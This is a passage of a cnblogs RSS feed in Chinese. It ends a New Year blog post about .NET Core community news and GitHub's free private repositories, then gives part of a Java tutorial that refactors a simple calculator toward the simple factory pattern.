&lt;p&gt;.NET Core项目实战交流群人数突破一千两百人&lt;br/&gt;这一天，其实目前这个这个交流人群人数才一千一百九十多人，这同样也是从11月中旬到现在这个系列教程开始以来所带来的产物吧！在这个群里我也是抱着学习的态度来跟大家进行交流，从他们身上我也学到了很多东西，大伙也都很积极的交流经验，分享技术！偶尔也会聊点骚！这也正是我们程序员的特征，如果面对面的交流可能半天也憋不出来一个屁，但是在网上聊的话却能谈天谈地！别看我分享技术的时候能写上千的文字，但是让我说出来的话，那你得在我脖子上架把刀才行了。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;2&quot;&gt;
&lt;p&gt;“DotNetCore实战”公众号人数突破500人&lt;br/&gt;这一天，我跟“金焰的世界”的“DotNetCore实战”这个公众号人数突破500人了。虽然只开通了&lt;br/&gt;短短一个月的时间，也只是在我的文章中进行穿插着宣传，但是增长的人数也足以说明越来越多的人喜欢.NET Core愿意学习.NET Core接触新鲜事物的积极性。当然这个公众号也只是为了第一时间推送我跟“金焰的世界”的博文而设的，当然最近我也会每天晚上九点钟左右推送最新的.NET Core技术文章。可能让我像张队那样每天推送，有点困难。但是我也会坚持每天记性推送的！这里向张队学习，至于究竟能坚持多久，那就看大伙的监督了！&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;h2 id=&quot;net-core相关的利好消息让人振奋&quot;&gt;.NET Core相关的利好消息让人振奋&lt;/h2&gt;
&lt;h3 id=&quot;net-core3.0的新特性&quot;&gt;.NET Core3.0的新特性&lt;/h3&gt;
&lt;p&gt;这一天，张队公众号推文中有篇描述.NET Core 3.0 特性的推文。里面讲述了.NET Core 的下一个主要版本最近进入了预览阶段，.NET Core 3.0 将支持使用 Windows Presentation Foundation （WPF）、Windows Forms（WinForms）、Entity Framework （EF）、Blazor、 C# 8 和.NETStandard 2.1 构建桌面应用程序。其他的就不过多介绍了，其中觉得比较新的就是对WPF以及WinForms的支持。&lt;br/&gt;同时这里还有一个很大的关注点就是.NET Core 3 的另一个主要关注点是物联网，它支持在 Raspberry Pi 和 Arduino 设备上使用的 GPIO、PWM、SPI 和 I2C API。正如石头哥所感慨的“最后需要注意的是，.NET Core 3 的另一个主要关注点是物联网，它支持在 Raspberry Pi 和 Arduino 设备上使用的 GPIO、PWM、SPI 和 I2C API。我的物联网梦想！”。&lt;br/&gt;这些都将在.NET Core 3中进行呈现。&lt;/p&gt;
&lt;h3 id=&quot;微软自证开源决心github-私有库免费无限开放&quot;&gt;微软自证开源决心：GitHub 私有库免费无限开放&lt;/h3&gt;
&lt;p&gt;1 月 7 日，GitHub CEO Nat Friedman 于官方博客公开发文，称“New year, new GitHub”，宣布从此将免费无限地为普通用户提供私有仓库服务，同时面向企业和组织推出了更简单统一的产品 GitHub Enterprise，共计两大主要更新。但是似乎昨天才开始刷屏，今天也在刷屏。&lt;/p&gt;
&lt;p&gt;无论坊间“阴谋论”几何，微软似乎都已经在拥抱开源这条路上越走越远了，无论是连续三年超越 Facebook、Google 名列 GitHub 第一，还是加入开源专利联盟 OIN（Open Invention Network），抑或是收购事件后的 10 月新品 GitHub Actions，以及此番的私仓免费开放，微软一直在用行动“洗白”过去扎根于开发者记忆中的开源“Anti-fan”形象。&lt;/p&gt;
&lt;p&gt;曾经各种“GitHub”看衰的言论也逐渐变了风向，微软更是从“强娶女儿的渣男”一跃升级成“爸爸”，开发者们直言微软这次“干得漂亮”。要说此次更新令人意外的程度，更有评论调侃称“我不懂英文你不要骗我”……&lt;/p&gt;
&lt;p&gt;俗话说的好，大树底下好乘凉，微软越成功，我们这些依托微软的开发者们也才能有更多更好的机会。&lt;/p&gt;
&lt;h3 id=&quot;oracle对jdk的收费以及.net-core给我们的机遇&quot;&gt;Oracle对JDK的收费以及.NET Core给我们的机遇&lt;/h3&gt;
&lt;p&gt;其实这一块前段时间炒的很火，最近声音在慢慢的淡化。所以我也不对这块做过多的阐述，其实我这里向引用张队一篇文章的话：&lt;br/&gt;2018年年末的听到大量的互联网公司裁员消息，但是我服务这几家客户都有很强烈的招聘.NET Core开发人员的需求，这是大量学习Java的同学转向.NET Core平台的好时机，我一直认为做Java开发的同学比做传统.NET的人员更容易用好.NET Core, Java相比C#，在使用了C#后你不会再去想用Java，而且.NET Core有你非常熟悉的Spring Cloud那一套约定的编程范式，然而见过很多.NET 开发人员， 依赖注入都没用过，更别说用Linux了。在这里我没有贬低.NET开发人员的意思，技术更多的还是要靠自己的努力，我们努力一起成为一群不被时代抛弃的程序猿。&lt;/p&gt;
&lt;h2 id=&quot;新年展望&quot;&gt;新年展望&lt;/h2&gt;
&lt;p&gt;我会跟“金焰的世界”一起把公众号运营好，坚持为大家分享更多实战技巧。如果可以的话这个CMS系列教程反向比较好的话，我会再录一个系列的.NET Core视频教程回馈给大家！&lt;br/&gt;极客时间订阅的的一些教程进行学习，努力提升自己,至少能够不掉队，努力向DevOps转变，提升！&lt;br/&gt;同时多向张队，大石头等圈内大牛学习，提升自己的眼界！&lt;br/&gt;最后祝大家元旦快乐，算是晚到的祝福吧！也同时祝大家新年快乐，虽然有点早！&lt;/p&gt;
&lt;h2 id=&quot;最后&quot;&gt;最后&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1377250/201901/1377250-20190109152506357-1361664973.png&quot; alt=&quot;1547018489796&quot;/&gt;&lt;/p&gt;
&lt;p&gt;窗外，大雪还在纷飞，既猛又烈，但是风景却很好，正如2018年的互联网圈，各种风起云涌，而微软独占鳌头重回世界第一市值的王座，虽然这些都与我无关，但是我想对大伙说，尤其是对.NET Core说，这会是一个很好的机遇！最后的最后在这2019年的第一场既猛又烈的大雪中，让我们一起立个Flag,一起加油，努力吧！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1377250/201901/1377250-20190109152503015-658295908.png&quot; alt=&quot;1547018542275&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Wed, 09 Jan 2019 07:27:00 +0000</pubDate>
<dc:creator>依乐祝</dc:creator>
<og:description>清晨起床，震惊了，窗外一片雪白，大雪纷飞，我承认我词穷了，说再多话也描述不了此刻的大好心情。所以，话不多说，先上一张朋友圈的图吧！ 趁着这么“好的”天气以及这么好的心情突然想写点东西记录一下自己的20</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/yilezhu/p/10244634.html</dc:identifier>
</item>
<item>
<title>设计模式 | 简单工厂模式 - 莫愆</title>
<link>http://www.cnblogs.com/imoqian/p/10244577.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/imoqian/p/10244577.html</guid>
<description>&lt;p&gt;按理说应该把书全都看完一遍，再开始写博客比较科学，会有比较全面的认识。&lt;/p&gt;
&lt;p&gt;但是既然都决定要按规律更新博客了，只能看完一个设计模式写一篇了。&lt;/p&gt;
&lt;p&gt;也算是逼自己思考了，不是看完就过，至少得把代码自己都敲一遍。&lt;/p&gt;
&lt;p&gt;刚开始可能写的比较浅显，更像是读书笔记，只能未来回来完善了。&lt;/p&gt;
&lt;p&gt;废话啰嗦到这，开始正题。&lt;/p&gt;

&lt;p&gt;文章是以一个面试中，面试官要求写一个计算器开头的。&lt;/p&gt;
&lt;p&gt;巧的是，在之前的一次面试中，刚好面试官也问了这个问题，当时我并不能给出令人满意的答案，只恨没有早点学习设计模式啊。&lt;/p&gt;
&lt;p&gt;代码不光是要完成功能就完事了，还要考虑健壮性、复用性、可扩展性等等。&lt;/p&gt;
&lt;p&gt;学习设计模式的意义也在于此，帮助我们写出更加优雅的代码。&lt;/p&gt;

&lt;p&gt;那么回到之前的问题，如果现在要你写一个计算器的程序，你会怎么写呢？&lt;/p&gt;
&lt;p&gt;我的第一反应和书中的菜鸟一样，特别还是在面试中，时间紧迫，当然是把功能完成了就OK，为什么要考虑那么复杂，写一个方法直接搞定：&lt;/p&gt;
&lt;p&gt;（这里为了代码的简洁性，暂时不考虑用户不按规范输入，除零、浮点失精这种健壮性问题。）&lt;/p&gt;
&lt;div readability=&quot;23.5&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;package&lt;/span&gt;&lt;span&gt; designpattern.staticfactorymethod;
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.Scanner;
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Calculator {
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt;      &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; main(String[] args) {
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt;            Scanner scanner = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Scanner(System.in);
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt;            System.out.println(&quot;请输入一个数字&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt;            &lt;span&gt;double&lt;/span&gt; num1 =&lt;span&gt; scanner.nextDouble();
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt;            System.out.println(&quot;请输入一个运算符：+、-、*、/&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt;            String operator = scanner.next();&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 不能用nextLine()，会把上一个回车给吸收&lt;/span&gt;
&lt;span&gt;10&lt;/span&gt;            System.out.println(&quot;请输入一个数字&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt;            &lt;span&gt;double&lt;/span&gt; num2 =&lt;span&gt; scanner.nextDouble();
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt;            &lt;span&gt;switch&lt;/span&gt;&lt;span&gt; (operator) {
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt;            &lt;span&gt;case&lt;/span&gt; &quot;+&quot;&lt;span&gt;:
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt;                 System.out.println(num1 +&lt;span&gt; num2);
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt;                 &lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;16&lt;/span&gt;            &lt;span&gt;case&lt;/span&gt; &quot;-&quot;&lt;span&gt;:
&lt;/span&gt;&lt;span&gt;17&lt;/span&gt;                 System.out.println(num1 -&lt;span&gt; num2);
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;                 &lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;19&lt;/span&gt;            &lt;span&gt;case&lt;/span&gt; &quot;*&quot;&lt;span&gt;:
&lt;/span&gt;&lt;span&gt;20&lt;/span&gt;                 System.out.println(num1 *&lt;span&gt; num2);
&lt;/span&gt;&lt;span&gt;21&lt;/span&gt;                 &lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;22&lt;/span&gt;            &lt;span&gt;case&lt;/span&gt; &quot;/&quot;&lt;span&gt;:
&lt;/span&gt;&lt;span&gt;23&lt;/span&gt;                 System.out.println(num1 /&lt;span&gt; num2);
&lt;/span&gt;&lt;span&gt;24&lt;/span&gt;                 &lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;25&lt;/span&gt;            &lt;span&gt;default&lt;/span&gt;&lt;span&gt;:
&lt;/span&gt;&lt;span&gt;26&lt;/span&gt;                 &lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;27&lt;/span&gt; &lt;span&gt;           }
&lt;/span&gt;&lt;span&gt;28&lt;/span&gt; &lt;span&gt;           scanner.close();
&lt;/span&gt;&lt;span&gt;29&lt;/span&gt; &lt;span&gt;     }
&lt;/span&gt;&lt;span&gt;30&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;最多把计算的方法单拉出来：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;43&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; designpattern.staticfactorymethod;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.Scanner;
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Calculator2 {
     &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; main(String[] args) {
           Scanner scanner &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Scanner(System.in);
           System.out.println(&lt;/span&gt;&quot;请输入一个数字&quot;&lt;span&gt;);
           &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; num1 =&lt;span&gt; scanner.nextDouble();
           System.out.println(&lt;/span&gt;&quot;请输入一个运算符：+、-、*、/&quot;&lt;span&gt;);
           String operator &lt;/span&gt;= scanner.next();&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 不能用nextLine()，会把上一个回车给吸收&lt;/span&gt;
           System.out.println(&quot;请输入一个数字&quot;&lt;span&gt;);
           &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; num2 =&lt;span&gt; scanner.nextDouble();
           &lt;/span&gt;&lt;span&gt;switch&lt;/span&gt;&lt;span&gt; (operator) {
           &lt;/span&gt;&lt;span&gt;case&lt;/span&gt; &quot;+&quot;&lt;span&gt;:
                System.out.println(plus(num1, num2));
                &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
           &lt;/span&gt;&lt;span&gt;case&lt;/span&gt; &quot;-&quot;&lt;span&gt;:
                System.out.println(minus(num1, num2));
                &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
           &lt;/span&gt;&lt;span&gt;case&lt;/span&gt; &quot;*&quot;&lt;span&gt;:
                System.out.println(multiply(num1, num2));
                &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
           &lt;/span&gt;&lt;span&gt;case&lt;/span&gt; &quot;/&quot;&lt;span&gt;:
                System.out.println(divide(num1, num2));
                &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
           &lt;/span&gt;&lt;span&gt;default&lt;/span&gt;&lt;span&gt;:
                &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
           }
           scanner.close();
     }
     &lt;/span&gt;&lt;span&gt;static&lt;/span&gt; &lt;span&gt;double&lt;/span&gt; plus(&lt;span&gt;double&lt;/span&gt; num1, &lt;span&gt;double&lt;/span&gt;&lt;span&gt; num2) {
           &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; num1 +&lt;span&gt; num2;
     }
     &lt;/span&gt;&lt;span&gt;static&lt;/span&gt; &lt;span&gt;double&lt;/span&gt; minus(&lt;span&gt;double&lt;/span&gt; num1, &lt;span&gt;double&lt;/span&gt;&lt;span&gt; num2) {
           &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; num1 -&lt;span&gt; num2;
     }
     &lt;/span&gt;&lt;span&gt;static&lt;/span&gt; &lt;span&gt;double&lt;/span&gt; multiply(&lt;span&gt;double&lt;/span&gt; num1, &lt;span&gt;double&lt;/span&gt;&lt;span&gt; num2) {
           &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; num1 *&lt;span&gt; num2;
     }
     &lt;/span&gt;&lt;span&gt;static&lt;/span&gt; &lt;span&gt;double&lt;/span&gt; divide(&lt;span&gt;double&lt;/span&gt; num1, &lt;span&gt;double&lt;/span&gt;&lt;span&gt; num2) {
           &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; num1 /&lt;span&gt; num2;
     }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这样虽然运算方法可以复用，但是显示和运算放在一起，你说它是个工具类吧，也不是，显得有些不伦不类。&lt;/p&gt;
&lt;p&gt;要我来改，我最多把运算方法单拉成一个工具类，就结束了：&lt;/p&gt;
&lt;div readability=&quot;24.5&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; designpattern.staticfactorymethod;
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; CalculatorUtil {
     &lt;/span&gt;&lt;span&gt;static&lt;/span&gt; &lt;span&gt;double&lt;/span&gt; plus(&lt;span&gt;double&lt;/span&gt; num1, &lt;span&gt;double&lt;/span&gt;&lt;span&gt; num2) {
           &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; num1 +&lt;span&gt; num2;
     }
     &lt;/span&gt;&lt;span&gt;static&lt;/span&gt; &lt;span&gt;double&lt;/span&gt; minus(&lt;span&gt;double&lt;/span&gt; num1, &lt;span&gt;double&lt;/span&gt;&lt;span&gt; num2) {
           &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; num1 -&lt;span&gt; num2;
     }
     &lt;/span&gt;&lt;span&gt;static&lt;/span&gt; &lt;span&gt;double&lt;/span&gt; multiply(&lt;span&gt;double&lt;/span&gt; num1, &lt;span&gt;double&lt;/span&gt;&lt;span&gt; num2) {
           &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; num1 *&lt;span&gt; num2;
     }
     &lt;/span&gt;&lt;span&gt;static&lt;/span&gt; &lt;span&gt;double&lt;/span&gt; divide(&lt;span&gt;double&lt;/span&gt; num1, &lt;span&gt;double&lt;/span&gt;&lt;span&gt; num2) {
           &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; num1 /&lt;span&gt; num2;
     }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;我发现自己用java写了这么长时间的代码，好歹是个面向对象的语言，但是封装用的很熟练，但是继承和多态几乎就没有用过。&lt;/p&gt;
&lt;p&gt;虽然《Thinking In Java》的作者说不能滥用继承：&lt;/p&gt;
&lt;div readability=&quot;26.5&quot;&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1532854/201901/1532854-20190109150610267-523718661.png&quot; alt=&quot;&quot;/&gt;&lt;p&gt;但是完全不用也是有问题的。&lt;/p&gt;
&lt;p&gt;书中写的例子对我蛮有启发的。&lt;/p&gt;
&lt;p&gt;假如我需要增加一个运算开根（sqrt）运算，怎么办？&lt;/p&gt;
&lt;p&gt;只能去改那个工具类，但是这会带来问题。&lt;/p&gt;
&lt;p&gt;首先，你增加一个方法，要让之前已经写好的加减乘除方法一起参与编译，增加了你不小心影响到之前方法的风险。&lt;/p&gt;
&lt;p&gt;其次，可能之前的方法含有敏感信息，你并没有权限看（这个问题我之前还真的从来没有思考过）&lt;/p&gt;
&lt;p&gt;那应该怎么办？&lt;/p&gt;
&lt;p&gt;自然是把所有的运算方法单独放在一个类里，这样就互相之间不影响，想新增直接新增类就可以了，不用看之前的代码。&lt;/p&gt;
&lt;p&gt;第一反应是写成这样，只是单纯的写成单独的类：（为了方便显示，写成了内部类；同样为了简洁setter、getter我就不写了）&lt;/p&gt;
&lt;div readability=&quot;22.5&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;43&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; designpattern.staticfactorymethod;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.Scanner;
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Calculator3 {
     &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; main(String[] args) {
           Scanner scanner &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Scanner(System.in);
           System.out.println(&lt;/span&gt;&quot;请输入一个数字&quot;&lt;span&gt;);
           &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; num1 =&lt;span&gt; scanner.nextDouble();
           System.out.println(&lt;/span&gt;&quot;请输入一个运算符：+、-、*、/&quot;&lt;span&gt;);
           String operator &lt;/span&gt;= scanner.next();&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 不能用nextLine()，会把上一个回车给吸收&lt;/span&gt;
           System.out.println(&quot;请输入一个数字&quot;&lt;span&gt;);
           &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; num2 =&lt;span&gt; scanner.nextDouble();
           Calculator3 calculator3 &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Calculator3();
           &lt;/span&gt;&lt;span&gt;switch&lt;/span&gt;&lt;span&gt; (operator) {
           &lt;/span&gt;&lt;span&gt;case&lt;/span&gt; &quot;+&quot;&lt;span&gt;:
                System.out.println(calculator3.&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Plus(num1, num2).calculate());
                &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
           &lt;/span&gt;&lt;span&gt;case&lt;/span&gt; &quot;-&quot;&lt;span&gt;:
                System.out.println(calculator3.&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Minus(num1, num2).calculate());
                &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
           &lt;/span&gt;&lt;span&gt;case&lt;/span&gt; &quot;*&quot;&lt;span&gt;:
                System.out.println(calculator3.&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Multiply(num1, num2).calculate());
                &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
           &lt;/span&gt;&lt;span&gt;case&lt;/span&gt; &quot;/&quot;&lt;span&gt;:
                System.out.println(calculator3.&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Divide(num1, num2).calculate());
                &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
           &lt;/span&gt;&lt;span&gt;default&lt;/span&gt;&lt;span&gt;:
                &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
           }
           scanner.close();
     }
     &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; Plus {
           &lt;/span&gt;&lt;span&gt;double&lt;/span&gt;&lt;span&gt; num1;
           &lt;/span&gt;&lt;span&gt;double&lt;/span&gt;&lt;span&gt; num2;
           Plus(&lt;/span&gt;&lt;span&gt;double&lt;/span&gt; num1, &lt;span&gt;double&lt;/span&gt;&lt;span&gt; num2) {
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.num1 =&lt;span&gt; num1;
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.num2 =&lt;span&gt; num2;
           }
           &lt;/span&gt;&lt;span&gt;double&lt;/span&gt;&lt;span&gt; calculate() {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; num1 +&lt;span&gt; num2;
           }
     }
     &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; Minus {
           &lt;/span&gt;&lt;span&gt;double&lt;/span&gt;&lt;span&gt; num1;
           &lt;/span&gt;&lt;span&gt;double&lt;/span&gt;&lt;span&gt; num2;
           Minus(&lt;/span&gt;&lt;span&gt;double&lt;/span&gt; num1, &lt;span&gt;double&lt;/span&gt;&lt;span&gt; num2) {
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.num1 =&lt;span&gt; num1;
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.num2 =&lt;span&gt; num2;
           }
           &lt;/span&gt;&lt;span&gt;double&lt;/span&gt;&lt;span&gt; calculate() {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; num1 -&lt;span&gt; num2;
           }
     }
     &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; Multiply {
           &lt;/span&gt;&lt;span&gt;double&lt;/span&gt;&lt;span&gt; num1;
           &lt;/span&gt;&lt;span&gt;double&lt;/span&gt;&lt;span&gt; num2;
           Multiply(&lt;/span&gt;&lt;span&gt;double&lt;/span&gt; num1, &lt;span&gt;double&lt;/span&gt;&lt;span&gt; num2) {
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.num1 =&lt;span&gt; num1;
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.num2 =&lt;span&gt; num2;
           }
           &lt;/span&gt;&lt;span&gt;double&lt;/span&gt;&lt;span&gt; calculate() {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; num1 *&lt;span&gt; num2;
           }
     }
     &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; Divide {
           &lt;/span&gt;&lt;span&gt;double&lt;/span&gt;&lt;span&gt; num1;
           &lt;/span&gt;&lt;span&gt;double&lt;/span&gt;&lt;span&gt; num2;
           Divide(&lt;/span&gt;&lt;span&gt;double&lt;/span&gt; num1, &lt;span&gt;double&lt;/span&gt;&lt;span&gt; num2) {
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.num1 =&lt;span&gt; num1;
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.num2 =&lt;span&gt; num2;
           }
           &lt;/span&gt;&lt;span&gt;double&lt;/span&gt;&lt;span&gt; calculate() {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; num1 /&lt;span&gt; num2;
           }
     }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;你会发现这几个类结构都是一模一样的，我几乎也是复制粘贴出来的，咱们是不是可以提取出一个共同的父类来？&lt;/p&gt;
&lt;div readability=&quot;45&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; designpattern.staticfactorymethod;
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;abstract&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Calculate {
     &lt;/span&gt;&lt;span&gt;double&lt;/span&gt;&lt;span&gt; num1;
     &lt;/span&gt;&lt;span&gt;double&lt;/span&gt;&lt;span&gt; num2;
     Calculate() {
     }
     Calculate(&lt;/span&gt;&lt;span&gt;double&lt;/span&gt; num1, &lt;span&gt;double&lt;/span&gt;&lt;span&gt; num2) {
           &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.num1 =&lt;span&gt; num1;
           &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.num2 =&lt;span&gt; num2;
     }
     &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;abstract&lt;/span&gt; &lt;span&gt;double&lt;/span&gt;&lt;span&gt; calculate();
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;具体运算子类们：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; designpattern.staticfactorymethod;
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; Plus &lt;span&gt;extends&lt;/span&gt;&lt;span&gt; Calculate {
     Plus() {
     }
     Plus(&lt;/span&gt;&lt;span&gt;double&lt;/span&gt; num1, &lt;span&gt;double&lt;/span&gt;&lt;span&gt; num2) {
           &lt;/span&gt;&lt;span&gt;super&lt;/span&gt;&lt;span&gt;(num1, num2);
     }
     @Override
     &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;double&lt;/span&gt;&lt;span&gt; calculate() {
           &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; num1 +&lt;span&gt; num2;
     }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; designpattern.staticfactorymethod;
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; Minus &lt;span&gt;extends&lt;/span&gt;&lt;span&gt; Calculate {
     Minus() {
     }
     Minus(&lt;/span&gt;&lt;span&gt;double&lt;/span&gt; num1, &lt;span&gt;double&lt;/span&gt;&lt;span&gt; num2) {
           &lt;/span&gt;&lt;span&gt;super&lt;/span&gt;&lt;span&gt;(num1, num2);
     }
     @Override
     &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;double&lt;/span&gt;&lt;span&gt; calculate() {
           &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; num1 -&lt;span&gt; num2;
     }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; designpattern.staticfactorymethod;
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; Multiply &lt;span&gt;extends&lt;/span&gt;&lt;span&gt; Calculate {
     Multiply() {
     }
     Multiply(&lt;/span&gt;&lt;span&gt;double&lt;/span&gt; num1, &lt;span&gt;double&lt;/span&gt;&lt;span&gt; num2) {
           &lt;/span&gt;&lt;span&gt;super&lt;/span&gt;&lt;span&gt;(num1, num2);
     }
     @Override
